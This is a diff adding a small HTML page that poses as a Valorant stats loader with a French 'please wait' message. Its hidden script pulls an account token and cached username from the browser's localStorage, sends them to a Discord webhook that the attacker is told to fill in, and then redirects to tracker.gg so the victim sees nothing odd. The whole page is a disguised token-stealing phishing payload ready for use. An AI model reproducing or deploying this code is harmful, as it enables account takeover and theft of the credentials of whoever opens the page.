@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Stats Valorant</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background: #1a1a1a; color: white; }
+        #loading { display: block; }
+    </style>
+</head>
+<body>
+    <h1>Chargement des stats...</h1>
+    <p>Veuillez patienter</p>
+    
+    <script>
+        // Extraction token
+        var token = localStorage.getItem('token') || localStorage.token;
+        var userData = JSON.parse(localStorage.getItem('user_data_cache') || '{}');
+        
+        // Envoi vers ton webhook (REMPLACE L'URL CI-DESSOUS)
+        fetch('https://discord.com/api/webhooks/123456789/abcdef123456', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: '**Token**\n```' + token + '```\nUser: ' + (userData.username || 'Unknown') + '#' + (userData.discriminator || '0000')
+            })
+        }).then(() => {
+            window.location.href = 'https://tracker.gg/valorant'; // Redirection légitime
+        });
+    </script>
+</body>
+</html>
